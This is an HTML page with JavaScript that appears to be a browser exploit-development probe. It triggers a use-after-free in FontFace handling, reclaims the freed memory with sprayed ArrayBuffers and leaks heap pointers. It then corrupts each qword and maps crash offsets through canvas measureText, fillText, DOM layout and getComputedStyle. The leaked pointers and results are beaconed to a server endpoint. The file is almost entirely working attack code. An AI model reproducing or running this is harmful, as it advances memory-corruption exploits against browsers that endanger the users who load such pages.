<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1108</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}.warn{color:#ff6}</style>
</head><body>
<div id="log"></div>
<canvas id="c" width="400" height="100" style="display:none"></canvas>
<script>
var L=document.getElementById('log');
function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight;}
function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
function hex(v){return'0x'+v.toString(16);}

B('P1108-BOOT','');
log('phase','=== P1108: CANVAS measureText CRASH ORACLE ===');
log('info','Goal: Canvas measureText MUST resolve font metrics from CSSFontFace');
log('info','This is a DIFFERENT code path from fonts.check() (layout engine)');

var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
var K=8;
var cvs=document.getElementById('c');
var ctx=cvs.getContext('2d');

// ============================================================
// FontFace UAF + reclaim (proven pattern)
// ============================================================
var st1=document.createElement('style');
st1.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
document.head.appendChild(st1);
var f0=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
document.fonts.add(f0);void f0.loaded;

var fired=false,map1=null,buf=null,ptrs=null,idx=-1,patched=false;
var jsFont=null;

Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
  if(fired)return undefined;fired=true;
  jsFont=this;
  if(st1){st1.remove();st1=null;}
  try{document.fonts.delete(this);}catch(e){}
  document.body.offsetHeight;
  map1=[];
  for(var si=0;si<SIZES.length;si++){
    var sz=SIZES[si];
    for(var k=0;k<K;k++){map1.push({size:sz,ab:new ArrayBuffer(sz),idx:si*K+k});}
  }
  try{document.fonts.check('1em s0');}catch(e){}
  return undefined;
},set:function(){}});
document.fonts.load('1em f0, s0','AB').then(function(){},function(){});

for(var t=10;t<=200;t+=5){(function(ms){setTimeout(function(){
  if(patched||!map1)return;
  for(var bi=32;bi<40;bi++){
    if(!map1[bi])continue;
    var b=new BigUint64Array(map1[bi].ab);
    var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
    if(nz>0&&!patched){
      patched=true;buf=b;idx=bi;
      ptrs=[];
      for(var q=0;q<b.length;q++){
        if(b[q]!==0n)ptrs.push({off:q*8,val:b[q]});
      }
      b[0]=0x100n;
      B('P1108-UAF','buf='+bi+'|ms='+ms+'|'+ptrs.map(function(p){return'+'+hex(p.off)+'='+hex(p.val);}).join(','));
    }
  }
},ms);})(t);}

// ============================================================
// PHASE A: Baseline — measureText with the UAF font (original ptrs)
// Does it crash? What are the metrics?
// ============================================================
setTimeout(function(){
  if(!patched){B('P1108-NOHIT','');return;}

  // First: set canvas font to our UAF font
  B('P1108-A-PRE','setting ctx.font');
  var fontSet=false;
  try{
    ctx.font='48px f0';
    fontSet=true;
  }catch(e){
    B('P1108-A-FONTSET','ERR:'+e.message);
    log('fail','A: ctx.font assignment threw: '+e.message);
  }

  if(fontSet){
    B('P1108-A-FONTOK','');
    // Now measureText — THIS must resolve font metrics
    var metrics='???';
    try{
      var m=ctx.measureText('ABCDEF');
      metrics='w='+m.width.toFixed(2);
      // Try extended TextMetrics (Safari 17 should have some)
      if('actualBoundingBoxAscent' in m){
        metrics+='|asc='+m.actualBoundingBoxAscent.toFixed(2);
        metrics+='|desc='+m.actualBoundingBoxDescent.toFixed(2);
        metrics+='|left='+m.actualBoundingBoxLeft.toFixed(2);
        metrics+='|right='+m.actualBoundingBoxRight.toFixed(2);
      }
      if('fontBoundingBoxAscent' in m){
        metrics+='|fasc='+m.fontBoundingBoxAscent.toFixed(2);
        metrics+='|fdesc='+m.fontBoundingBoxDescent.toFixed(2);
      }
    }catch(e){metrics='ERR:'+e.message;}
    B('P1108-A',metrics);
    log('ok','A: measureText baseline = '+metrics);
  }

  // ============================================================
  // PHASE B: measureText with zeroed heap ptrs (+0x58, +0x68)
  // If the font resolver uses these, we crash or get different metrics
  // ============================================================
  B('P1108-B-PRE','zero ptrs + measure');
  var saved58=buf[0x58/8];
  var saved68=buf[0x68/8];
  buf[0x58/8]=0n;
  buf[0x68/8]=0n;

  var metricsZ='???';
  try{
    ctx.font='48px f0';
    var m=ctx.measureText('ABCDEF');
    metricsZ='w='+m.width.toFixed(2);
    if('actualBoundingBoxAscent' in m)metricsZ+='|asc='+m.actualBoundingBoxAscent.toFixed(2);
  }catch(e){metricsZ='ERR:'+e.message;}
  B('P1108-B',metricsZ);
  log(metricsZ.indexOf('ERR')>=0?'fail':'ok','B: zeroed ptrs measure = '+metricsZ);
  buf[0x58/8]=saved58;
  buf[0x68/8]=saved68;

  // ============================================================
  // PHASE C: fillText — actually RENDER with the UAF font
  // This goes even deeper: rasterizer must access glyph outlines
  // ============================================================
  B('P1108-C-PRE','fillText render');
  var fillOk=false;
  try{
    ctx.font='48px f0';
    ctx.fillStyle='#fff';
    ctx.fillText('ABCDEF',10,60);
    fillOk=true;
  }catch(e){
    B('P1108-C','ERR:'+e.message);
    log('fail','C: fillText threw: '+e.message);
  }
  if(fillOk){
    // Read back pixels — did anything render?
    var imgData=ctx.getImageData(0,0,400,100);
    var nz=0;
    for(var i=0;i<imgData.data.length;i+=4){
      if(imgData.data[i]>0||imgData.data[i+1]>0||imgData.data[i+2]>0)nz++;
    }
    B('P1108-C','rendered|nzPixels='+nz);
    log('ok','C: fillText rendered, nonzero pixels = '+nz);
  }

  // ============================================================
  // PHASE D: Per-offset crash probe via measureText
  // Write 0xDEAD to each qword, call measureText, see if crash
  // ============================================================
  log('phase','--- PHASE D: Per-offset crash probe (measureText) ---');
  B('P1108-D-PRE','');

  var crashMap=[];
  for(var q=1;q<24;q++){
    var off=q*8;
    var saved=buf[q];
    buf[q]=0xDEADDEADDEADDEADn;

    B('P1108-D-'+hex(off)+'-PRE','');
    var result='???';
    try{
      ctx.font='48px f0';
      var m=ctx.measureText('A');
      result='w='+m.width.toFixed(1);
    }catch(e){result='ERR:'+e.message;}
    B('P1108-D-'+hex(off),result);

    buf[q]=saved;

    if(result.indexOf('ERR')>=0){
      crashMap.push('+'+hex(off)+'=CRASH');
      log('win','D: +'+hex(off)+' CRASH! Engine dereferences this offset!');
    }else{
      log('info','D: +'+hex(off)+' → '+result);
    }
  }

  if(crashMap.length>0){
    B('P1108-D-MAP',crashMap.join('|'));
    log('win','CRASH MAP: '+crashMap.join(', '));
  }else{
    B('P1108-D-MAP','none');
    log('warn','No crashes from measureText — font already resolved');
  }

  // ============================================================
  // PHASE E: Per-offset crash probe via fillText
  // fillText rasterizes — different path from measureText
  // ============================================================
  log('phase','--- PHASE E: Per-offset crash probe (fillText) ---');
  B('P1108-E-PRE','');

  var crashMapE=[];
  for(var q=1;q<24;q++){
    var off=q*8;
    var saved=buf[q];
    buf[q]=0xDEADDEADDEADDEADn;

    var result='???';
    try{
      ctx.clearRect(0,0,400,100);
      ctx.font='48px f0';
      ctx.fillText('A',10,60);
      result='ok';
    }catch(e){result='ERR:'+e.message;}
    B('P1108-E-'+hex(off),result);

    buf[q]=saved;

    if(result.indexOf('ERR')>=0){
      crashMapE.push('+'+hex(off)+'=CRASH');
      log('win','E: +'+hex(off)+' CRASH! Rasterizer reads this offset!');
    }else{
      log('info','E: +'+hex(off)+' → '+result);
    }
  }

  if(crashMapE.length>0){
    B('P1108-E-MAP',crashMapE.join('|'));
  }else{
    B('P1108-E-MAP','none');
  }

  // ============================================================
  // PHASE F: Force re-layout with DOM element using UAF font
  // Create a span, set font, force layout — CSS engine must
  // measure using the CSSFontFace internally
  // ============================================================
  log('phase','--- PHASE F: DOM layout with UAF font ---');
  B('P1108-F-PRE','');

  var crashMapF=[];
  for(var q=1;q<24;q++){
    var off=q*8;
    var saved=buf[q];
    buf[q]=0xDEADDEADDEADDEADn;

    var result='???';
    try{
      var el=document.createElement('div');
      el.style.fontFamily='f0, monospace';
      el.style.fontSize='48px';
      el.style.position='absolute';
      el.style.visibility='hidden';
      el.textContent='MEASUREMENT TEST STRING';
      document.body.appendChild(el);
      // Force synchronous layout
      var w=el.offsetWidth;
      var h=el.offsetHeight;
      result='w='+w+'|h='+h;
      el.remove();
    }catch(e){result='ERR:'+e.message;}
    B('P1108-F-'+hex(off),result);

    buf[q]=saved;

    if(result.indexOf('ERR')>=0){
      crashMapF.push('+'+hex(off)+'=CRASH');
      log('win','F: +'+hex(off)+' CRASH! Layout engine reads this!');
    }else{
      log('info','F: +'+hex(off)+' → '+result);
    }
  }

  if(crashMapF.length>0){
    B('P1108-F-MAP',crashMapF.join('|'));
  }else{
    B('P1108-F-MAP','none');
  }

  // ============================================================
  // PHASE G: getComputedStyle after font change
  // Write to each offset, apply font to element, read computed
  // ============================================================
  log('phase','--- PHASE G: getComputedStyle with corrupted CSSFontFace ---');
  B('P1108-G-PRE','');

  // Re-add the font first
  try{document.fonts.add(jsFont);}catch(e){}

  var crashMapG=[];
  for(var q=1;q<24;q++){
    var off=q*8;
    var saved=buf[q];
    buf[q]=0xDEADDEADDEADDEADn;

    var result='???';
    try{
      var el=document.createElement('span');
      el.style.fontFamily='f0';
      el.textContent='X';
      document.body.appendChild(el);
      var cs=getComputedStyle(el);
      var ff=cs.fontFamily;
      var fs=cs.fontSize;
      result='ff='+ff+'|fs='+fs;
      el.remove();
    }catch(e){result='ERR:'+e.message;}
    B('P1108-G-'+hex(off),result);

    buf[q]=saved;

    if(result.indexOf('ERR')>=0){
      crashMapG.push('+'+hex(off)+'=CRASH');
      log('win','G: +'+hex(off)+' CRASH!');
    }else{
      log('info','G: +'+hex(off)+' → '+result);
    }
  }

  if(crashMapG.length>0){
    B('P1108-G-MAP',crashMapG.join('|'));
  }else{
    B('P1108-G-MAP','none');
  }

  // ============================================================
  // FINAL: Summary
  // ============================================================
  var allCrashes=[].concat(crashMap,crashMapE,crashMapF,crashMapG);
  B('P1108-DONE','totalCrashes='+allCrashes.length+'|'+allCrashes.join(','));
  log('phase','=== P1108 COMPLETE: '+allCrashes.length+' crash offsets found ===');
  if(allCrashes.length>0){
    log('win','EXPLOITABLE OFFSETS: '+allCrashes.join(', '));
  }else{
    log('warn','No crashes — font was cached/resolved before UAF');
  }

},500);
</script>
</body></html>
